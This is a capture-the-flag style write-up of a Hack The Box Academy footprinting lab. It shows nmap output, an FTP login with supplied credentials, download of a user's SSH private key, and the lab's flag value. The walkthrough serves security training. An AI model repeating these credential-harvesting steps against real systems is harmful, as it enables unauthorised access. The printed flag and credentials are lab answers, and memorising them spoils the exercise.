# Section 19: Footprinting Lab - Easy

Module: 04. Footprinting

---

## NMAP Emuneration
```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.134.133]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Ceil's FTP) [10.129.134.133]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.95%I=7%D=7/24%Time=6A63013E%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,9D,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb
SF:\)\x20\[10\.129\.134\.133\]\r\n500\x20Invalid\x20command:\x20try\x20bei
SF:ng\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x2
SF:0more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.95%I=7%D=7/24%Time=6A63013E%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8E,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.1
SF:29\.134\.133\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x2
SF:0creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Leverage FTP
Use `"ceil:qwer1234"` to login the FTP, first is the port `21`:
```bash
┌─[eu-academy-1]─[10.10.14.112]─[htb-ac-2162140@htb-ry34gajyyx]─[~]
└──╼ [★]$ ftp -p 10.129.134.133 21
Connected to 10.129.134.133.
220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.134.133]
Name (10.129.134.133:root): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44633|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp> ls
229 Entering Extended Passive Mode (|||39949|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp> ls -la
229 Entering Extended Passive Mode (|||37130|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4096 Nov 10  2021 .
drwxr-xr-x   2 root     root         4096 Nov 10  2021 ..
226 Transfer complete
ftp> pwd
Remote directory: /
ftp> 
```
Nothing here, so tried port `2121`, and successfully got the `id_rsa` to SSH to the machine:
```bash
┌─[eu-academy-1]─[10.10.14.112]─[htb-ac-2162140@htb-ry34gajyyx]─[~]
└──╼ [★]$ ftp 10.129.134.133 2121
Connected to 10.129.134.133.
220 ProFTPD Server (Ceil's FTP) [10.129.134.133]
Name (10.129.134.133:root): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||21229|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> cd .ssh
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||31315|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||22083|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |***********************************|  3381        2.08 MiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (21.16 KiB/s)
ftp> 
```

## From the SSH key get the flag
Get the flag:
```bash
ceil@NIXEASY:~$ cat /home/flag/flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```
---

[Back to Module Index](./README.md)
